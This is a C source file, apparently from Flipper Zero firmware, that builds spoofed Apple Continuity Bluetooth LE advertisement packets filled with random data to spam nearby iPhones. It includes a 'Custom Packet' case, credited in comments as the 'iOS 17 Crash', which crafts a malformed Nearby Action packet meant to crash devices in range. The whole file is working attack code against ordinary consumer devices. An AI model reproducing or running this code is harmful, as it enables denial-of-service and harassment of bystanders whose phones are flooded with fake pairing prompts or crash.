#include "continuity.h"
#include <furi_hal_random.h>
#include <core/core_defines.h>

// Hacked together by @Willy-JL
// Custom adv logic by @Willy-JL (idea by @xMasterX)
// iOS 17 Crash by @ECTO-1A
// Extensive testing and research on behavior and parameters by @Willy-JL and @ECTO-1A
// Structures docs and Nearby Action IDs from https://github.com/furiousMAC/continuity/
// Proximity Pair IDs from https://github.com/ECTO-1A/AppleJuice/
// Controversy explained at https://willyjl.dev/blog/the-controversy-behind-apple-ble-spam

static const char* continuity_type_names[ContinuityTypeCount] = {
    [ContinuityTypeAirDrop] = "AirDrop",
    [ContinuityTypeProximityPair] = "Proximity Pair",
    [ContinuityTypeAirplayTarget] = "Airplay Target",
    [ContinuityTypeHandoff] = "Handoff",
    [ContinuityTypeTetheringSource] = "Tethering Source",
    [ContinuityTypeNearbyAction] = "Nearby Action",
    [ContinuityTypeNearbyInfo] = "Nearby Info",
    [ContinuityTypeCustomCrash] = "Custom Packet",
};
const char* continuity_get_type_name(ContinuityType type) {
    return continuity_type_names[type];
}

#define HEADER_LEN (6) // 1 Length + 1 ? + 2 Company ID + 1 Continuity Type + 1 Continuity Length
static uint8_t continuity_packet_sizes[ContinuityTypeCount] = {
    [ContinuityTypeAirDrop] = HEADER_LEN + 18,
    [ContinuityTypeProximityPair] = HEADER_LEN + 25,
    [ContinuityTypeAirplayTarget] = HEADER_LEN + 6,
    [ContinuityTypeHandoff] = HEADER_LEN + 14,
    [ContinuityTypeTetheringSource] = HEADER_LEN + 6,
    [ContinuityTypeNearbyAction] = HEADER_LEN + 5,
    [ContinuityTypeNearbyInfo] = HEADER_LEN + 5,
    [ContinuityTypeCustomCrash] = HEADER_LEN + 11,
};
uint8_t continuity_get_packet_size(ContinuityType type) {
    return continuity_packet_sizes[type];
}

void continuity_generate_packet(const ContinuityMsg* msg, uint8_t* packet) {
    uint8_t size = continuity_get_packet_size(msg->type);
    uint8_t i = 0;

    packet[i++] = size - 1; // Packet Length
    packet[i++] = 0xFF; // Packet Type (Manufacturer Specific)
    packet[i++] = 0x4C; // Packet Company ID (Apple, Inc.)
    packet[i++] = 0x00; // ...
    packet[i++] = msg->type; // Continuity Type
    packet[i] = size - i - 1; // Continuity Length
    i++;

    switch(msg->type) {
    case ContinuityTypeAirDrop:
        packet[i++] = 0x00; // Zeros
        packet[i++] = 0x00; // ...
        packet[i++] = 0x00; // ...
        packet[i++] = 0x00; // ...
        packet[i++] = 0x00; // ...
        packet[i++] = 0x00; // ...
        packet[i++] = 0x00; // ...
        packet[i++] = 0x00; // ...
        packet[i++] = 0x01; // Version
        packet[i++] = (rand() % 256); // AppleID
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // Phone Number
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // Email
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // Email2
        packet[i++] = (rand() % 256); // ...
        packet[i++] = 0x00; // Zero
        break;

    case ContinuityTypeProximityPair:
        packet[i++] = msg->data.proximity_pair.prefix; // Prefix (paired 0x01 new 0x07 airtag 0x05)
        packet[i++] = msg->data.proximity_pair.model >> 8;
        packet[i++] = msg->data.proximity_pair.model & 0xFF;
        packet[i++] = 0x55; // Status
        packet[i++] = ((rand() % 10) << 4) + (rand() % 10); // Buds Battery Level
        packet[i++] = ((rand() % 8) << 4) + (rand() % 10); // Charing Status and Battery Case Level
        packet[i++] = (rand() % 256); // Lid Open Counter
        packet[i++] = 0x00; // Device Color
        packet[i++] = 0x00;
        furi_hal_random_fill_buf(&packet[i], 16); // Encrypted Payload
        i += 16;
        break;

    case ContinuityTypeAirplayTarget:
        packet[i++] = (rand() % 256); // Flags
        packet[i++] = (rand() % 256); // Configuration Seed
        packet[i++] = (rand() % 256); // IPv4 Address
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        break;

    case ContinuityTypeHandoff:
        packet[i++] = 0x01; // Version
        packet[i++] = (rand() % 256); // Initialization Vector
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // AES-GCM Auth Tag
        packet[i++] = (rand() % 256); // Encrypted Payload
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        break;

    case ContinuityTypeTetheringSource:
        packet[i++] = 0x01; // Version
        packet[i++] = (rand() % 256); // Flags
        packet[i++] = (rand() % 101); // Battery Life
        packet[i++] = 0x00; // Cell Service Type
        packet[i++] = (rand() % 8); // ...
        packet[i++] = (rand() % 5); // Cell Service Strength
        break;

    case ContinuityTypeNearbyAction:
        packet[i] = msg->data.nearby_action.flags; // Action Flags
        if(packet[i] == 0xBF && rand() % 2) packet[i]++; // Ugly hack to shift 0xBF-0xC0 for spam
        i++;
        packet[i++] = msg->data.nearby_action.type;
        furi_hal_random_fill_buf(&packet[i], 3); // Authentication Tag
        i += 3;
        break;

    case ContinuityTypeNearbyInfo:
        packet[i++] = ((rand() % 16) << 4) + (rand() % 16); // Status Flags and Action Code
        packet[i++] = (rand() % 256); // Status Flags
        packet[i++] = (rand() % 256); // Authentication Tag
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        break;

    case ContinuityTypeCustomCrash:
        // Found by @ECTO-1A

        i -= 2; // Override segment header
        packet[i++] = ContinuityTypeNearbyAction; // Type
        packet[i++] = 0x05; // Length
        packet[i++] = 0xC1; // Action Flags
        const uint8_t types[] = {0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0};
        packet[i++] = types[rand() % COUNT_OF(types)]; // Action Type
        furi_hal_random_fill_buf(&packet[i], 3); // Authentication Tag
        i += 3;

        packet[i++] = 0x00; // ???
        packet[i++] = 0x00; // ???

        packet[i++] = ContinuityTypeNearbyInfo; // Type ???
        furi_hal_random_fill_buf(&packet[i], 3); // Shenanigans (Length + IDK) ???
        i += 3;
        break;

    default:
        break;
    }
}
